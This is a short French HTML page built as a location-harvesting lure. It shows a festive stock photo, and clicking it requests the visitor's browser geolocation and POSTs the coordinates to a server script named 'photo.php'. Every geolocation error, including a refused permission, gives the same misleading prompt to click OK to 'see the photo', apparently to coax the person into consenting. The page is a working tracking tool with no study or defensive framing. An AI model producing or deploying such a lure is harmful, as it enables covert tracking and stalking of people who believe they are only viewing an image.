<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Géolocalisation via Image</title>
    <script>
        // Fonction pour obtenir la géolocalisation
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                alert("La géolocalisation n'est pas supportée par ce navigateur.");
            }
        }

        // Envoie la position au serveur via une requête POST
        function sendLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            // Affiche un message pour confirmer
            alert('Position trouvée ! Latitude: ' + latitude + ', Longitude: ' + longitude);

            // Crée une requête pour envoyer les données au serveur
            var xhr = new XMLHttpRequest();
            var url = "photo.php";  // Remplace par l'URL de ton script (PHP, Node.js, etc.)
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    console.log(xhr.responseText);  // Réponse du serveur (optionnel)
                }
            };
            xhr.send("latitude=" + latitude + "&longitude=" + longitude);
        }

// Gestion des erreurs de géolocalisation
        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("Clique sur OK pour voir la photo");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Clique sur OK pour voir la photo");
                    break;
                case error.TIMEOUT:
                    alert("Clique sur OK pour voir la photo");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("Clique sur OK pour voir la photo");
                    break;
            }
        }
    </script>
</head>
<body>

    <!-- L'image sur laquelle cliquer pour être localisé -->
    <img src="https://img.freepik.com/photos-gratuite/fond-noel-mignon-bokeh_1361-3548.jpg?t=st=1735328349~exp=1735331949~hmac=2c11914ddbf1797858b622d7a88fee8682dc39549a5981aa8fc0705c88cfca5c&w=1380" alt="Cliquez ici pour être localisé" width="500px" onclick="getLocation()" style="cursor:pointer;">
    
    <!-- Optionnel : Afficher les coordonnées directement sur la page -->

</body>
</html>
